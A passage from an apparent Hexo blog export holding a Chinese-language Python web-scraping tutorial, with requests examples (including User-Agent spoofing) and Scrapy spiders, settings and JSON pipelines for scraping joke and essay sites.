'scrapy.extensions.telnet.TelnetConsole': None,\n  # }\n  \n  # Configure item pipelines\n  # See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n  ITEM_PIPELINES = {\n     'xiushi.pipelines.XiushiPipeline': 300,\n  }\n  \n  # Enable and configure the AutoThrottle extension (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n  # AUTOTHROTTLE_ENABLED = True\n  # The initial download delay\n  # AUTOTHROTTLE_START_DELAY = 5\n  # The maximum download delay to be set in case of high latencies\n  # AUTOTHROTTLE_MAX_DELAY = 60\n  # The average number of requests Scrapy should be sending in parallel to\n  # each remote server\n  # AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n  # Enable showing throttling stats for every response received:\n  # AUTOTHROTTLE_DEBUG = False\n  \n  # Enable and configure HTTP caching (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n  # HTTPCACHE_ENABLED = True\n  # HTTPCACHE_EXPIRATION_SECS = 0\n  # HTTPCACHE_DIR = 'httpcache'\n  # HTTPCACHE_IGNORE_HTTP_CODES = []\n  # HTTPCACHE_STORAGE = 'scrapy.extensions.httpcache.FilesystemCacheStorage'\n  \n  ```\n\n  #### spider 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  import scrapy\n  from xiushi.items import XiushiItem\n  \n  \n  class XiushispiderSpider(scrapy.Spider):\n      name = 'xiushiSpider'\n      allowed_domains = ['qiushidabaike.com']\n      start_urls = ['http://qiushidabaike.com/index_1.html']\n      base_domain = 'http://qiushidabaike.com'\n  \n      def parse(self, response):\n          duanzi = response.xpath('//div[@class=\"main-left fl\"]//dl')\n          for it in duanzi:\n              title = it.xpath('./dt/span/a/text()').get().strip()\n              text = it.xpath('./dd[@class=\"content\"]//text()').getall()\n              text = \"\".join(text).strip()\n              item = XiushiItem(title=title, text=text)\n              yield item\n          # 进行翻页操作\n          next_url = response.xpath('//div[@class=\"page\"]//a[@class=\"next\"]/@href').get()\n          if not next_url:\n              return\n          else:\n              yield scrapy.Request(self.base_domain+next_url, callback=self.parse)\n  \n  ```\n\n  #### pipelines 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  \n  # Define your item pipelines here\n  #\n  # Don't forget to add your pipeline to the ITEM_PIPELINES setting\n  # See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n  \"\"\"\n  # 第一种方法，没进行json优化，但是看起来简单易操作\n  import json\n  \n  \n  class XiushiPipeline(object):\n      def __init__(self):\n          self.fp = open('duanzi.json', 'w', encoding='utf-8')\n  \n      def open_spider(self, spider):\n          print('爬虫开始了...')\n  \n      def process_item(self, item, spider):\n          item_json = json.dumps(dict(item),  ensure_ascii=False)\n          self.fp.write(item_json+'\\n')\n          return item\n  \n      def close_spider(self, spider):\n          self.fp.close()\n          print(\"爬虫结束了...\")\n  \"\"\"\n  # 方案二，json优化，结果是每个字典存储在列表中\n  #        好处是满足json规则，坏处是数据量较大时比较耗内存\n  # ''' 自我感觉这种方法不咋地 '''\n  # from scrapy.exporters import JsonItemExporter\n  #\n  #\n  # class XiushiPipeline(object):\n  #     def __init__(self):\n  #         # 注意此时以二进制形式写入\n  #         self.fp = open('duanzi.json', 'wb')\n  #         self.exporter = JsonItemExporter(self.fp, ensure_ascii=False, encoding='utf-8')\n  #         self.exporter.start_exporting()\n  #\n  #     def open_spider(self, spider):\n  #         print('爬虫开始了...')\n  #\n  #     def process_item(self, item, spider):\n  #         self.exporter.export_item(item)\n  #         return item\n  #\n  #     def close_spider(self, spider):\n  #         self.exporter.finish_exporting()\n  #         self.fp.close()\n  #         print(\"爬虫结束了...\")\n  \n  '''方案三'''\n  from scrapy.exporters import JsonLinesItemExporter\n  \n  \n  class XiushiPipeline(object):\n      def __init__(self):\n          # 注意此时以二进制形式写入\n          self.fp = open('duanzi.json', 'wb')\n          self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False, encoding='utf-8')\n  \n      def open_spider(self, spider):\n          print('爬虫开始了...')\n  \n      def process_item(self, item, spider):\n          self.exporter.export_item(item)\n          return item\n  \n      def close_spider(self, spider):\n          self.fp.close()\n          print(\"爬虫结束了...\")\n  \n  ```\n\n  * 可以在总文件中创建.py文件，代替爬虫开始命令 scrapy crawl xiushiSpider (注意应在爬虫目录下执行该命令)\n\n```python\nfrom scrapy import cmdline\n\ncmdline.execute(\"scrapy crawl xiushiSpider\".split())\n# cmdline.execute([\"scrapy\", 'crawl', 'xiushiSpider'])\n```\n\n# 爬虫第六天\n\n### scrapy 框架之spider类（示例二.爬取优美散文）\n\n- item部分\n\n```python\n# -*- coding: utf-8 -*-\n\n# Define here the models for your scraped items\n#\n# See documentation in:\n# https://doc.scrapy.org/en/latest/topics/items.html\n\nimport scrapy\n\n\nclass ProseItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    title = scrapy.Field()\n    text = scrapy.Field()\n\n```\n\n\n\n- settings部分\n\n```python\n# -*- coding: utf-8 -*-\n\n# Scrapy settings for prose project\n#\n# For simplicity, this file contains only settings considered important or\n# commonly used. You can find more settings consulting the documentation:\n#\n#     https://doc.scrapy.org/en/latest/topics/settings.html\n#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n\nBOT_NAME = 'prose'\n\nSPIDER_MODULES = ['prose.spiders']\nNEWSPIDER_MODULE = 'prose.spiders'\n\n# Crawl responsibly by identifying yourself (and your website) on the user-agent\n# USER_AGENT = 'prose (+http://www.yourdomain.com)'\n\n# Obey robots.txt rules\nROBOTSTXT_OBEY = False\n\n# Configure maximum concurrent requests performed by Scrapy (default: 16)\n# CONCURRENT_REQUESTS = 32\n\n# Configure a delay for requests for the same website (default: 0)\n# See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n# See also autothrottle settings and docs\nDOWNLOAD_DELAY = 1\n# The download delay setting will honor only one of:\n# CONCURRENT_REQUESTS_PER_DOMAIN = 16\n# CONCURRENT_REQUESTS_PER_IP = 16\n\n# Disable cookies (enabled by default)\n# COOKIES_ENABLED = False\n\n# Disable Telnet Console (enabled by default)\n# TELNETCONSOLE_ENABLED = False\n\n# Override the default request headers:\nDEFAULT_REQUEST_HEADERS = {\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n    'Accept-Language': 'en',\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '\n                  'Chrome/80.0.3987.163 Safari/537.36 '\n}\n\n# Enable or disable spider middlewares\n# See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n# SPIDER_MIDDLEWARES = {\n#    'prose.middlewares.ProseSpiderMiddleware': 543,\n# }\n\n# Enable or disable downloader middlewares\n# See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n# DOWNLOADER_MIDDLEWARES = {\n#    'prose.middlewares.ProseDownloaderMiddleware': 543,\n# }\n\n# Enable or disable extensions\n# See https://doc.scrapy.org/en/latest/topics/extensions.html\n# EXTENSIONS = {\n#    'scrapy.extensions.telnet.TelnetConsole': None,\n# }\n\n# Configure item pipelines\n# See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\nITEM_PIPELINES = {\n   'prose.pipelines.ProsePipeline': 300,\n}\n\n# Enable and configure the AutoThrottle extension (disabled by default)\n# See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n# AUTOTHROTTLE_ENABLED = True\n# The initial download delay\n# AUTOTHROTTLE_START_DELAY = 5\n# The maximum download delay to be set in case of high latencies\n# AUTOTHROTTLE_MAX_DELAY = 60\n# The average number of requests Scrapy should be sending in parallel to\n# each remote server\n# AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n# Enable showing throttling stats for every response received:\n# AUTOTHROTTLE_DEBUG = False\n\n# Enable and configure HTTP caching (disabled by default)\n# See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n# HTTPCACHE_ENABLED = True\n# HTTPCACHE_EXPIRATION_SECS = 0\n# HTTPCACHE_DIR = 'httpcache'\n# HTTPCACHE_IGNORE_HTTP_CODES = []\n# HTTPCACHE_STORAGE = 'scrapy.extensions.httpcache.FilesystemCacheStorage'\n\n```\n\n- proseSpider部分\n\n```python\n# -*- coding: utf-8 -*-\nimport scrapy\nfrom prose.items import ProseItem\n\n\nclass ProsespiderSpider(scrapy.Spider):\n    name = 'proseSpider'\n    allowed_domains = ['duwenzhang.com']\n    start_urls = ['http://www.duwenzhang.com/wenzhang/shenghuosuibi/']\n    base_url = 'http://www.duwenzhang.com/wenzhang/shenghuosuibi/'\n\n    def parse(self, response):\n        # xpath 选择不含有某一属性的标签\n        url_list = response.xpath('//center//tr[2]//td[(@valign) and not(@height)]/table')\n        for it in url_list:\n            title = it.xpath('.//tr[2]//td[@height=\"26\"]/b/a/text()').getall()\n            text = it.xpath('.//tr[4]/td[@style=\"padding-left:3px\"]/text()').getall()\n            text = \"\".join(text).strip()\n            item = ProseItem(title=title, text=text)\n            yield item\n        # //a[contains(text(), \"百度搜索\")]  【可以部分检索】\n        # //a[text()=\"文字内容\"] 【需要填全】 xpath定位指定文本标签\n        next_url = response.xpath('//tr//a[text()=\"下一页\"]/@href').get()\n        if not next_url:\n            return\n        else:\n            yield scrapy.Request(self.base_url+next_url, callback=self.parse)\n\n\n```\n\n\n\n- piplines 部分\n\n```python\n# -*- coding: utf-8 -*-\n\n# Define your item pipelines here\n#\n# Don't forget to add your pipeline to the ITEM_PIPELINES setting\n# See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n\nimport json\nfrom scrapy.exporters import JsonLinesItemExporter\n\n\nclass ProsePipeline(object):\n    def __init__(self):\n        self.fp = open('prose.json', 'wb')\n        self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False,\n                                              encoding='utf-8')\n\n    def open_spider(self, spider):\n        print('爬虫开始了...')\n\n    def process_item(self, item, spider):\n        self.exporter.export_item(item)\n        return item\n\n    def close_spider(self, spider):\n        self.fp.close()\n        print('爬虫结束了....')\n```\n\n\n\n","slug":"spider","published":1,"updated":"2021-06-20T02:35:38.537Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzb0500357vvtbcwgeluv","content":"<h1 id=\"爬虫第一天\"><a href=\"#爬虫第一天\" class=\"headerlink\" title=\"爬虫第一天\"></a>爬虫第一天</h1><ul>\n<li>urllib太过古老，因此不加以深入学习</li>\n</ul>\n<h3 id=\"requests\"><a href=\"#requests\" class=\"headerlink\" title=\"requests\"></a>requests</h3><p>requests模块：python中原生的一款基于网络请求的模块，功能强大，简单便捷，效率高。<br>作用：模拟浏览器发送请求。</p>\n<p>如何使用：（requests模块的编码流程）<br>    -指定url<br>    -发起请求（get或post）<br>    -获取响应数据<br>    -持久化存储（数据库或本地存储）</p>\n<p>环境安装：<br>    -pip或pycharm安装<br>    -anaconda自带（方便已装）</p>\n<span id=\"more\"></span>\n\n<h3 id=\"实战编码：\"><a href=\"#实战编码：\" class=\"headerlink\" title=\"实战编码：\"></a><strong>实战编码：</strong></h3><pre><code>- 需求：爬取拉勾网首页的数据\n    示例：\n</code></pre>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\">#step 1:指定url</span></span><br><span class=\"line\">    url = <span class=\"string\">&quot;https://www.lagou.com/jobs/6889986.html?show=96e52fa1d2134ad483eac5662bcc9fc6&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#step_2:发起请求</span></span><br><span class=\"line\">    <span class=\"comment\">#get会返回一个响应对象</span></span><br><span class=\"line\">    response = requests.get(url=url)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#step_3:获取相应数据(.text返回的是字符串形式的响应数据)</span></span><br><span class=\"line\">    page_text = response.text</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(page_text)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#step_4:持久化存储</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./lagou.html&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, encoding = <span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">        fp.write(page_text)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;爬取数据结束&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>以上代码极有可能会被网站捕获，被识别出为爬虫，所以需要实施反爬虫策略</p>\n</li>\n<li><p>示例：<br>UA:User-Agent (请求载体的身份标识)<br>UA检测：门户网站的服务器会检测对应的载体身份标识，如果检测到请求的载体身份标识为某一款浏览器，<br>说明该请求是一个正常的请求。但是，如果监测到请求的载体身份标识不是基于某一款浏览器的，则表示<br>该请求为不正常的请求（爬虫），则服务器端就很有可能拒绝这次请求。<br>UA伪装:将对应的请求载体身份标识伪装成一款浏览器</p>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># UA伪装：将对应的User-Agent封装到一个字典中</span></span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    url = <span class=\"string\">&#x27;https://www.sogou.com/web?&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#处理url携带的参数：封装到字典中（参数为问号后面的）</span></span><br><span class=\"line\">    kw = <span class=\"built_in\">input</span>(<span class=\"string\">&#x27;enter a word:&#x27;</span>)</span><br><span class=\"line\">    param = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;query&#x27;</span>: kw</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 需求的响应返回的是一个对象，对象应实例化</span></span><br><span class=\"line\">    response = requests.get(url=url, params=param, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 确认相应数据是txt类型的</span></span><br><span class=\"line\">    page_text = response.text</span><br><span class=\"line\">    fileName = kw+<span class=\"string\">&#x27;.html&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(fileName, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">        fp.write(page_text)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;保存成功。。。&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"爬虫第二天\"><a href=\"#爬虫第二天\" class=\"headerlink\" title=\"爬虫第二天\"></a>爬虫第二天</h1><h3 id=\"有关于ajax\"><a href=\"#有关于ajax\" class=\"headerlink\" title=\"有关于ajax\"></a>有关于ajax</h3><h4 id=\"爬取百度翻译的内容\"><a href=\"#爬取百度翻译的内容\" class=\"headerlink\" title=\"爬取百度翻译的内容\"></a>爬取百度翻译的内容</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\">#获取url</span></span><br><span class=\"line\">    post_url = <span class=\"string\">&#x27;https://fanyi.baidu.com/sug&#x27;</span></span><br><span class=\"line\">    <span class=\"comment\">#进行UA伪装</span></span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">#post请求的参数处理（同get请求一致）</span></span><br><span class=\"line\">    word = <span class=\"built_in\">input</span>(<span class=\"string\">&#x27;输入你想翻译的东西:&#x27;</span>)</span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;kw&#x27;</span>: word</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">#发送请求并生成响应</span></span><br><span class=\"line\">    response = requests.post(url=post_url, data=data, headers=headers)</span><br><span class=\"line\">    <span class=\"comment\">#获取响应数据:</span></span><br><span class=\"line\">    <span class=\"comment\">#json()方法返回的是obj （如果确认响应数据是json类型的）</span></span><br><span class=\"line\">    dic_obj = response.json()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#持久化存储</span></span><br><span class=\"line\">    filename = word+<span class=\"string\">&#x27;.json&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(filename, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">        json.dump(dic_obj, fp=fp, ensure_ascii=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#将jaon格式转化成dict格式</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(filename, <span class=\"string\">&#x27;r&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">        great = json.load(fp)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#将字典格式化输出(此字典中存在字典与列表的嵌套现象)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> great.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">list</span>:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> v:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(k)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(v)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;end...&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"爬取豆瓣电影信息\"><a href=\"#爬取豆瓣电影信息\" class=\"headerlink\" title=\"爬取豆瓣电影信息\"></a>爬取豆瓣电影信息</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##此处代码示例为失败的例子，未考虑到由ajax得到的页面依旧采用了ajax</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;https://movie.douban.com/j/chart/top_list&#x27;</span></span><br><span class=\"line\">    param = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;type&#x27;</span>: <span class=\"string\">&#x27; 24&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;interval_id&#x27;</span>: <span class=\"string\">&#x27; 100:90&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;action&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;start&#x27;</span>: <span class=\"string\">&#x27; 1&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;limit&#x27;</span>: <span class=\"string\">&#x27; 20&#x27;</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;User-Agent&#x27;</span>:<span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    response = requests.get(url=url, params=param, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">    list_data = response.json()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./douban.json&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">        json.dump(list_data, fp, ensure_ascii=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./douban.json&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">        great = json.load(fp)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(great)</span><br></pre></td></tr></table></figure>\n<h1 id=\"爬虫学习第三天\"><a href=\"#爬虫学习第三天\" class=\"headerlink\" title=\"爬虫学习第三天\"></a>爬虫学习第三天</h1><h3 id=\"爬取国家药监总局部分信息\"><a href=\"#爬取国家药监总局部分信息\" class=\"headerlink\" title=\"爬取国家药监总局部分信息\"></a>爬取国家药监总局部分信息</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsList&#x27;</span></span><br><span class=\"line\">    url_2 = <span class=\"string\">&#x27;http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsById&#x27;</span></span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;User-Agent&#x27;</span>:<span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">#爬取的页数</span></span><br><span class=\"line\">    page_ = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;请输入您想爬取的信息页数：&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> page <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"built_in\">int</span>(page_)+<span class=\"number\">1</span>):</span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;on&#x27;</span>: <span class=\"string\">&#x27;true&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;page&#x27;</span>: page,</span><br><span class=\"line\">            <span class=\"string\">&#x27;pageSize&#x27;</span>: <span class=\"string\">&#x27;15&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;productName&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;conditionType&#x27;</span>: <span class=\"string\">&#x27;1&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;applyname&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;applysn&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">#id_list have many ids</span></span><br><span class=\"line\">        id_list = []</span><br><span class=\"line\">        message = []</span><br><span class=\"line\"></span><br><span class=\"line\">        json_list = requests.post(url=url, data=data, headers=headers).json()</span><br><span class=\"line\">        <span class=\"comment\">#id_a is a dict</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> id_a <span 